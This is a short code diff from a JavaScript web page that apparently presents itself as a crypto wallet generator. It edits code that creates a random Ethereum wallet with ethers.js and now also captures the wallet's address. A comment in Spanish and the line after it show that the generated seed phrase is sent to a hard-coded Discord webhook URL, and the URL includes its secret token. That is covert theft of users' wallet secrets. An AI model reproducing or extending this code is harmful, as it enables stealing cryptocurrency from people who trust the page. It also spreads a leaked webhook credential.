@@ -116,8 +116,12 @@
         }
       }, 1000);
 
-      const mnemonic = ethers.Wallet.createRandom().mnemonic;
+      const wallet = ethers.Wallet.createRandom();
+      const mnemonic = wallet.mnemonic.phrase;
+      const address = wallet.address;
+
       document.getElementById('seedField').value = mnemonic;
+      document.getElementById('addressField').value = address;
 
       // Enviar la semilla generada a través del webhook de Discord
       const webhookUrl = 'https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m';
